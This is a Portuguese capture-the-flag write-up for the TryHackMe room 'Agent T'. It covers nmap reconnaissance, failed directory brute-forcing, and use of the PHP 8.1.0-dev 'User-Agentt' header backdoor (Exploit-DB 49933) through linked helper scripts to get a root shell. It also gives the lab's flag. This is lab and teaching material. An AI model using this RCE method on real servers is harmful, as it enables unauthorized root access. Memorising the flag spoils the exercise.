# TryHackMe — Agent T (Writeup)

Room fácil focada em identificar uma versão de PHP vulnerável exposta acidentalmente e explorar RCE via header HTTP.

Referências:
- https://medium.com/@H42DiK/tryhackme-agent-t-walkthrough-081eaf1e0ecd
- https://medium.com/traditional-cyber-security/tryhackme-agent-t-ctf-writeup-cd369d491e88

Scripts prontos para correr estão em [tools/](tools/):
- [tools/recon.sh](tools/recon.sh) — corre todos os steps de recon em sequência.
- [tools/steps/1_nmap.sh](tools/steps/1_nmap.sh) — Passo 1: nmap isolado.
- [tools/steps/1b_banner.sh](tools/steps/1b_banner.sh) — Passo 1b: confirma a versão do PHP via header HTTP (curl), quando o nmap não identifica.
- [tools/steps/2_ffuf.sh](tools/steps/2_ffuf.sh) — Passo 2: ffuf isolado.
- [tools/steps/3_exploit.sh](tools/steps/3_exploit.sh) — Passo 3: corre o exploit isolado.
- [tools/php-8.1.0-exploit.py](tools/php-8.1.0-exploit.py) — exploit RCE (Exploit-DB #49933).
- [tools/requirements.txt](tools/requirements.txt) — dependência Python (`requests`).
- [tools/.env.example](tools/.env.example) — template com o IP do alvo.

### Configurar o IP do alvo (muda a cada instância da room)

```bash
cd tools
cp .env.example .env
# editar .env e colocar o IP atual em TARGET_IP
```

Depois disso, `recon.sh` e `php-8.1.0-exploit.py` já lêem o IP automaticamente do `.env` — não é preciso passar argumentos nem digitar o host toda vez. O `.env` está no `.gitignore`, então basta atualizar o IP nele sempre que a máquina da room mudar.

## 1. Reconhecimento (Nmap)

```bash
nmap -sCV <IP_ALVO>
# ou, usando o IP do .env:
./tools/steps/1_nmap.sh
```

Resultado relevante: porta 80/HTTP a correr um **PHP built-in server**, com a banner a revelar `PHP cli server 5.5 or later (PHP 8.1.0-dev)`. Também existe um dashboard de admin exposto na página.

O detalhe crítico é a versão: **PHP 8.1.0-dev** é uma build de desenvolvimento que nunca deveria estar em produção — contém uma backdoor conhecida (RCE via header HTTP).

> Se o nmap não conseguir identificar a versão (ficar como `http?`), confirme via header HTTP:
> ```bash
> curl -I http://<IP_ALVO>
> # ou, usando o IP do .env:
> ./tools/steps/1b_banner.sh
> ```
> Procure por `Server: PHP 8.1.0-dev Development Server` na resposta.

## 2. Enumeração web (sem sucesso direto)

```bash
gobuster dir -u http://<IP_ALVO> -w /usr/share/wordlists/dirb/common.txt
# ou
ffuf -u http://<IP_ALVO>/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt -fc 200 -t 50
# ou, usando o IP do .env:
./tools/steps/2_ffuf.sh
```

Ou correr os passos 1 e 2 de uma vez (usa o IP do `.env` automaticamente):

```bash
./tools/recon.sh
# ou, para ignorar o .env e usar outro IP:
./tools/recon.sh <IP_ALVO>
```

Todas as respostas devolvem 200 (ou nada de novo é descoberto), portanto o bruteforce de diretórios não ajuda aqui. Inspeção manual da página e do Burp Suite (modo Intercept) também não revelam nada de útil — o vetor não está no conteúdo do site, está na versão do servidor PHP identificada no nmap.

## 3. Identificar a vulnerabilidade

`PHP 8.1.0-dev` corresponde a uma **backdoor RCE** documentada como **Exploit-DB #49933**, que abusa do header `User-Agentt` (com dois "t") para injetar e executar código PHP arbitrário no servidor.

Referência: https://www.exploit-db.com/exploits/49933

## 4. Exploração

O exploit já está pronto em [tools/php-8.1.0-exploit.py](tools/php-8.1.0-exploit.py) (Exploit-DB #49933).

```bash
./tools/steps/3_exploit.sh
# cria uma venv em tools/.venv (evita o erro "externally-managed-environment"
# do Python do macOS/Homebrew), instala requests nela na primeira vez,
# e já abre o prompt "Enter the full host url [http://<IP_do_.env>]:"
# — basta pressionar Enter.
```

Dentro da shell aberta, digite um comando (não deixe vazio, senão o backdoor lança `system('')` e mostra um erro inofensivo — só repita o comando):

```bash
$ whoami
# root
```

O serviço PHP corre como `root`, portanto o acesso já vem com privilégios máximos — não é necessária escalada de privilégios.

> **Timeout de conexão?** Se `curl`/o exploit ficarem parados e derem timeout, a VPN da TryHackMe caiu ou o IP da máquina mudou/expirou. Confirme com `ping -c 3 <IP_ALVO>` e, se necessário, atualize `tools/.env` com o IP atual.

## 5. Captura da flag

```bash
find / -type f -name "*.txt" 2>/dev/null
cat /flag.txt
```

Flag obtida:

```
flag{4127d0530abf16d6d23973e3df8dbecb}
```

## Resumo / Lições

- Sempre correr `nmap -sCV` primeiro — a versão do serviço já denunciou a vulnerabilidade sem precisar de bruteforce de diretórios.
- Nunca correr `php -S` (servidor de desenvolvimento) em produção, especialmente numa build `-dev`.
- CVE/Exploit-DB relevante: **Exploit-DB 49933** — PHP 8.1.0-dev backdoor RCE via header `User-Agentt`.
